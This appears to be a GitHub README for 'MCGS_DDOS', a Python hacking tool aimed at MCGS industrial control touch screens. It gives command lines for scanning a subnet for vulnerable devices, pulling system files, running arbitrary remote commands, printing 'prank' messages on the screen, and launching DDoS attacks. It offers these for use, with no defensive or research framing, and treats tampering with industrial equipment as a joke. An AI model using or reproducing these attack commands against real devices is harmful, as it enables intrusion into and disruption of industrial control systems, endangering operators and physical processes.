  <div align="center">
 <p align="center">
 <img title="MCGS" src='https://img.shields.io/badge/MCGS_DDOS-1.0.0-brightgreen.svg' />
 <img title="MCGS" src='https://img.shields.io/badge/Python-3.9-yellow.svg' />
  <img title="MCGS" src='https://img.shields.io/badge/HackerTool-x' />
 <img title="MCGS" src='https://img.shields.io/static/v1?label=Author&message=@Martin&color=red'/>
 <img title="MCGS" src='https://img.shields.io/badge/-Linux-F16061?logo=linux&logoColor=000'/>
 <img title="MCGS" src='https://img.shields.io/badge/-Windows-F16061?logo=windows&logoColor=000'/> 
</p>
  <img height="137px" src="https://github-readme-stats.vercel.app/api?username=MartinXMax&hide_title=true&hide_border=true&show_icons=trueline_height=21&text_color=000&icon_color=000&bg_color=0,ea6161,ffc64d,fffc4d,52fa5a&theme=graywhite" />
  
   
 <table>
  <tr>
      <th>Function</th>
  </tr>
  <tr>
    <th>
        Attack industrial network devices MCGS
    </th>
    
  </tr>
 </table>
</div>

# industrial control equipment

  ![图片名称](./PT/mcgs.png)  

  ![图片名称](./PT/mcgs2.png)  


# usage method
  * View help information

      ```#python3 MCGS_DD.py -h```

  ![图片名称](./PT/help.png)  

# Scan for vulnerabilities in the internal network of industrial control devices (MCGS touch screen)

  ```#python3 MCGS_DD.py -scan 192.168.100.0/24```

  ![图片名称](./PT/scan.png)  

# Attack industrial control devices and obtain device system files

```#python3 MCGS_DD.py -rh 192.168.100.3```

  ![图片名称](./PT/result.png)  
  
# Arbitrary command execution

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd ipconfig```
  
![图片名称](./PT/ipconfig.png)  

_PS:You can use the (- echo) parameter to print the results on the MCGS touch screen, which is a prank_

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd Martin_Hacking...........[X_X] -echo```
  
![图片名称](./PT/hacking.png)  

# DDOS attacks

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd Martin_Hacking...........[X_X] -echo -dd```
  
![图片名称](./PT/ddos.png)  